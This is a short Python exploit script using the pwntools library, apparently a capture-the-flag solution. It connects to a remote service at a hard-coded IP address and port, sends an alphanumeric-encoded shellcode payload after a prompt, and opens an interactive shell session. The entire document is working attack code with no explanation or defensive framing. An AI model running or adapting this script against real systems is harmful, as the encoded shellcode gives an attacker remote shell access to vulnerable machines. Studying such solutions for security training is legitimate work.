#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()
p = process('./pwn')
p = remote('101.71.29.5', 10080)
#gdb.attach(p, 'b* 0x400CA3')
dbg()

p.recvuntil('say?\n')
p.send('Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103Z0y113U2r114k0y103c150z3Y7N0S1m157O0V0B0X1P2K4x3B5p0A7l1l07')
p.interactive()
p.close()